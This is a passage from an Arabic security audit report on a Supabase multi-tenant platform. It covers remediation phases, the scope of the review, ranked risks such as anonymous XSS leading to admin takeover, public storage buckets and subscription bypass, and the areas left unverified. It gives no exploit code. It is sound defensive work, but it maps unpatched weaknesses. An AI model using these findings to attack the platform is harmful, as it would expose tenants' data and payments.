20. عدّاد حد معدل ذرّي لمفاتيح API (M-01) · 21. احمِ `metadata->billing_method` (M-02) · 22. لا تُعد `user_id` من `check-subdomain-status` (M-03) · 23. راجع دوال كشف البريد (M-04) · 24. اشتقّ IP في الخادم في `sie_rate_limit_hit` (M-05) · 25. امنع قراءة `two_factor_secret` من العميل (M-06) · 26. `FOR UPDATE` في `transfer_points_from_central` (M-07) · 27. `assertScope` يفشل مغلقًا (M-08) · 28. ثبّت نسخ CDN + SRI (M-09) · 29. رقِّ `xlsx` و`dompurify` (M-10) · 30. قيّد `status` في طلبات الشحن (M-11) · 31. طابور تعويض للخصم الفاشل (M-12) · 32. `(select auth.uid())` في الـ180 سياسة + دمج المتداخل (M-13) · 33. فهارس للمفاتيح الأجنبية الساخنة (M-14) · 34. وحّد `api-auth.ts` (M-15) · 35. استعلام مباشر في `pi-auth` (M-16) · 36. حد معدل على `site_errors` (M-17) · 37. احذف الدوال الميتة (M-18) · 38. قوالب بريد ثابتة + تدقيق (M-19).

### Phase 4 — Improvements

39. انتقل إلى `supabase/migrations/` الرسمي بجدول تتبّع · 40. وحّد نموذجَي العزل على `company_of()` · 41. أزل ازدواج `mcp-arch` ×3 وواجهة MCP ×2 · 42. أضف خطوة بناء وتجزئة (`index.html` 124KB، `logo.png` 1MB) · 43. `REVOKE EXECUTE` على دوال المحفّزات من `anon`/`authenticated` · 44. ثبّت `search_path` في الدوال التسع · 45. انقل `pg_net`/`http` خارج `public` · 46. فعّل حماية كلمات المرور المسرَّبة · 47. أزل `console.log` من مسارات المصادقة · 48. احذف `_rollback/` والتقارير القديمة من الجذر · 49. أضف Dependabot/Renovate · 50. أكمل `data-deletion.html` · 51. سياسات صريحة للجداول الـ19 لتوثيق نية «مغلق» · 52. أزل الفهارس الـ85 غير المستخدمة والـ3 المكرّرة.

---

## Files Reviewed

**قاعدة البيانات (فحص مباشر على الإنتاج، قراءة فقط):** 160 جدولًا · ~470 سياسة RLS · كل المحفّزات على `profiles`, `tickets`, `api_tokens`, `integrations`, `messages`, `whatsapp_subscriptions`, `forum_*`, `community_*`, `site_errors` · أجسام ~35 دالة (السلطة، الاشتراكات، المحفظة، SIE، كشف البريد) · مستودعات وسياسات التخزين · منح الجداول والأعمدة · مستشارا الأمان والأداء الكاملان.

**الترحيلات:** 41 ملفًا (`001`–`042`) — قراءة كاملة لـ007، 008، 017، 022، 023، 024، 027، 028، 029، 030، 035، 036، 040، 042؛ ومسح موجَّه للبقية.

**دوال الحافة (مستودع):** 42 دالة — قراءة كاملة لـ`verify-2fa`, `verify-otp`, `generate-2fa-secret`, `disable-2fa`, `create-api-token`, `create-sub-user`, `check-dns-status`, `check-subdomain-status`, `mcp` (+`api-auth`, `actor`, `authz`, `tickets-service`, `customers-service`, `notifications-service`), `send-whatsapp` (+`whatsapp-service`, `api-auth`), `meta-webhook`, `pi-auth`, `accounting-sync`, `huggingface-chatbot`, `get-attachment-url`, `send-ticket-email`, `oauth-authorize-approve`, `ai-gateway` (المصادقة), `sie-channel-telegram`; ومسح لأنماط المصادقة والـCORS في الباقي.

**دوال الحافة (إنتاج فقط، لا مصدر في المستودع):** `gemini-proxy` (كاملة) · `integrations-api` (12 ملفًا، كاملة).

**الواجهة:** `auth-client.js`, `api-config.js`, `supabase-config.js`, `constants.js`, `turnstile-config.js`, `sie-config.js`, `assets/js/page-guard.js`, `assets/js/access-policy.js`, `error-service.js`, `error-tracker.js`, `forum.js`, `admin/errors.html`, `login.html` (مسارات المصادقة), `2fa-verify.html`, `telegram-otp.html`, `customer-dashboard.js` (المُصيّرات), `assets/js/admin/inbox.js`, `assets/js/admin/central-wallet*.js`, `assets/js/admin/whatsapp-wallet-topup-service.js`, `whatsapp-subscription-service.js`; ومسح نمطيّ لـ`innerHTML` و`localStorage` و`rpc(` عبر 200 ملف JS و86 ملف HTML.

**البنية التحتية:** `package.json`, `package-lock.json`, `vercel.json`, `.gitignore`, `.github/workflows/tests.yml`, `.github/workflows/codeql.yml`, `tests/run-sql-tests.sh`, فهرس `tests/`, `supabase/functions/_AUDIT_NOTES.md`, `supabase/functions/_PRODUCTION_SNAPSHOTS.md`, فهرس `docs/`.

---

## Final Assessment

### أهم نقاط القوة

1. **النموذج الأمني صحيح من حيث المبدأ.** الحماية في القاعدة، والواجهة تُعلن عدم موثوقيتها صراحةً في التعليقات. هذا الموقف نادر في مشاريع بهذا الحجم، وهو ما جعل أغلب ما فحصتُه سليمًا.
2. **بوابات التفويض الذرّية في القاعدة** (`api_token_issue_context`, `sub_user_create_context`) — قرار معماري ممتاز يمنع انحراف شرط الصلاحية بين طبقتين.
3. **فصل نطاقات السلطة الثلاثة** ونزع البريد من الدوال المركزية (024/038/039/040/041) — عمل صعب ومنفَّذ بدقة ومُختبَر.
4. **جودة التوثيق في الترحيلات استثنائية.** كل ملف يذكر الجذر والدليل والأثر والتراجع، وكثير منها يحمل تحققًا ذاتيًا يمنع تطبيقًا ناقصًا.
5. **إصلاحات أمنية سابقة حقيقية وصحيحة:** `verify-2fa` (سرّ يتحكم فيه المنادي)، `pi-auth` (كلمة مرور مشتقة من معرّف عام)، `check-dns-status` (كتابة مجهولة)، `sie-channel-telegram` (GET مفتوح). كلها أُغلقت بشكل صحيح وتحقّقتُ منها.
6. **حزمة اختبار RLS حقيقية في CI** تعمل على Postgres فعلي، مع بوابة تمنع «تخطّي الاختبارات» من أن يُحسَب نجاحًا.
7. **`wa_wallet_charge_message` و`integrations-api`** نماذج صحيحة تمامًا لما يجب أن يكون عليه مسار الفوترة — الإصلاح في H-03 هو **تعميم نمط قائم** لا اختراع جديد.

### أهم نقاط الضعف

1. **الفجوة بين ما هو مكتوب وما هو منشور.** ستة ترحيلات أمنية مكتوبة ومختبَرة وغير مطبَّقة، و19 دالة منشورة بلا مصدر. هذا ليس خطأ تقنيًّا بل خلل عمليات، وهو مصدر أربع من أصل سبع ثغرات حرجة.
2. **RLS تحرس الصفوف لا الأعمدة، والمشروع يعتمد على محفّزات لسدّ الفرق — وأهمها غير منشور.** جذر بنيوي مشترك لـC-02 وC-03 وM-02 وM-11.
3. **مسار المال غير مكتمل.** المحفظة والفوترة مبنيّتان بشكل صحيح، لكن مسارين من ثلاثة لا يمرّان بهما.
4. **2FA والحظر ميزتان معلَنتان للمستخدم وغير منفَّذتين في الخادم.** هذا أخطر من غيابهما، لأنه يمنح ثقة زائفة.
5. **الازدواج** (ثلاث نسخ من `mcp-arch`، نسختان من `api-auth`) — وقد انحرفت إحداهما فعلًا، وهو دليل قائم لا تحذير نظري.

### أكبر المخاطر الحالية (مرتَّبة)

1. **C-06 → استيلاء على حساب الإدارة.** مجهول بلا حساب يزرع XSS في لوحة الإدارة؛ التوكن في `localStorage`؛ والنتيجة وصول كامل إلى كل بيانات كل المستأجرين. أقصر مسار من «لا شيء» إلى «كل شيء».
2. **C-04 + C-05 → تسريب ورفع في التخزين.** مستندات عملاء وإيصالات دفع مقروءة للعالم، ورفع بلا مصادقة. أثر خصوصي وتنظيمي مباشر، ولا يحتاج المهاجم حسابًا.
3. **C-01 + C-02 → انهيار نموذج الإيراد.** طريقان مستقلان لتجاوز الاشتراك بنداء REST واحد.
4. **C-07 → خرق عزل المستأجرين، حيّ ومعروف وموثَّق داخل المستودع منذ مراجعة سابقة ولم يُنفَّذ إغلاقه.**
5. **H-03 → نزيف مالي مفتوح** على حساب Meta الخاص بالمنصة.

### ما يجب إصلاحه قبل الإنتاج (غير قابل للتأجيل)

كل Phase 1 — البنود التسعة. وأضيف إليها من Phase 2 بندَين لا أراهما قابلَين للتأجيل:
- **البند 17** (بوابة CI للتطابق مع الإنتاج): بدونها ستعود نفس الفئة من الثغرات بعد شهر.
- **البند 13** (تنفيذ الحظر): بدونه لا تملك المنصة أي وسيلة لإيقاف مُسيء بعد اكتشافه — وهو ما ستحتاجه يوم الإطلاق تحديدًا.

### ما يمكن تأجيله بأمان

- كل Phase 4 عدا البند 39 (تتبّع الترحيلات).
- الأداء (M-13, M-14, L-08): المشروع اليوم عند 32 ملفًا شخصيًا و37 تذكرة و160 جدولًا. `auth_rls_initplan` لن يُشعر به أحد قبل عشرات الآلاف من الصفوف. أصلحه في Phase 3 بهدوء لا تحت ضغط.
- M-03 و M-04 (كشف المعرّفات والبريد): يقلّان خطورة كثيرًا بمجرد إغلاق C-07 الذي يستهلكهما.
- L-01 (CORS) و L-07 (جلسة الزائر): آثارهما نظرية في الوضع الحالي.
- L-10 (تبعية النطاق): مؤلم لكنه تشغيلي لا أمني، وله خطة موثّقة بالفعل في `docs/MCP-CANONICAL-CUTOVER.md`.

### Areas Not Fully Verified — وما السبب

أسجّل هذه صراحةً لأن تقريرًا يخفي حدوده تقرير مضلِّل:

1. **17 دالة حافة منشورة لم أراجعها** (من أصل 19 بلا مصدر؛ راجعتُ `gemini-proxy` و`integrations-api` فقط). **من بينها سبع بـ`verify_jwt = false`** — أي سطح هجوم غير مُقيَّم بالكامل. **السبب:** لا مصدر في المستودع، وقراءة كلٍّ منها من الإنتاج تتجاوز نطاق جلسة واحدة. **الأولوية:** `telegram-webhook`, `whatsapp-webhook`, `subdomain-auth-check`, `exchange-token`, `inbound-email-webhook`, `resend-inbound-webhook`, `wf-executor`, `sie-api`, `aqar-auth`, `manage-subdomain`.
2. **متغيرات البيئة.** لم أستطع قراءة `META_APP_SECRET`, `WHATSAPP_TOKEN`, `RESEND_WEBHOOK_SECRET`, `SYNC_SECRET`, `MCP_ENC_KEY`, `WHATSAPP_TOKEN_ENC_KEY`. لذلك H-06 مصنَّف «الكود مؤكَّد، الاستغلال يتوقف على البيئة». **يحتاج تحقّقًا يدويًا.**
3. **مخطط `emp_ops`** لم يدخل النطاق إطلاقًا (ظهر فقط في مستشار الأداء بـ108 مفاتيح أجنبية بلا فهارس). هو نطاق سلطة ثالث مستقل حسب `access-policy.js`، ويستحق مراجعة منفصلة كاملة.
4. **194 دالة `SECURITY DEFINER` قابلة للتنفيذ من `authenticated`** — راجعتُ منها ~35 (كل ما يمسّ المال والصلاحيات والاشتراكات والـSIE). البقية غير مراجَعة فرديًّا.
5. **86 ملف HTML** — مسحتُ نمط `innerHTML` مع الاستيفاء عبر المشروع كله وتتبّعت النتائج ذات القيمة، لكن مراجعة سطرًا بسطر للملفات الضخمة (`index.html`, `api-docs.html`, `board.html`, `leads.html`, `knowledgebase.html`, `developers.html`) لم تقع. **قد تحمل نظائر لـC-06.**
6. **`chatbot_memory`** — السياسة تسمح لـ`anon` بقراءة كل الصفوف، والجدول **فارغ اليوم**. صنّفتُها Potential لا Confirmed لأن لا بيانات مكشوفة الآن؛ لكنها ستصير Critical في اللحظة التي يُملأ فيها الجدول.
7. **لا اختبار اختراق حيّ.** كل ما أُثبت أُثبت داخل معاملات قاعدة بيانات رُجِع عنها. لم أرسل طلبًا واحدًا إلى أي دالة حافة ولم أرفع ملفًا ولم أكتب صفًّا ثابتًا. فالثغرات المصنَّفة **Confirmed** مثبتة على مستوى القاعدة والكود؛ أما السلوك الشبكي النهائي (مثل ردّ Storage على رفع مجهول) فمستنتَج من السياسة والإعداد لا من طلب فعلي.
8. **لم أراجع سجلات الإنتاج** بحثًا عن علامات استغلال سابق. **أوصي بذلك بشدّة** قبل أي إصلاح، خصوصًا لـC-01 وC-03: `whatsapp_subscriptions` بحثًا عن صفوف `active` بلا `reviewed_by`، و`api_tokens` بحثًا عن `scopes` تحمل `admin:full` لمالك ليس طاقمًا.

---

### الحكم النهائي

المشروع مبنيّ على أساس أمني **فوق المتوسط بوضوح**، ويحمل أدلة على عمل أمني جادّ ومنهجي ومكتوب بعناية. لكن **جزءًا جوهريًّا من ذلك العمل لم يصل إلى الإنتاج**، والنتيجة أن الحالة الفعلية للمنصة اليوم أضعف بكثير مما يوحي به المستودع.

**غير جاهز للإنتاج في الحالة الحالية.** لكن المسافة إلى الجاهزية قصيرة وواضحة: خمسة من إصلاحات Phase 1 التسعة **مكتوبة بالفعل في المستودع وتنتظر التطبيق فقط**، وواحد منها حذف دالة واحدة من لوحة التحكم. الجهد الحقيقي الجديد محصور في C-03 وC-06 وC-05 — وثلاثتها إصلاحات صغيرة ومحدَّدة.

والأهم من كل إصلاح فردي: **البند 17**. بدون بوابة تثبت أن ما في المستودع هو ما يعمل فعلًا، ستعود هذه الفئة من الثغرات بالضبط — لأن سببها الجذري ليس في الكود.
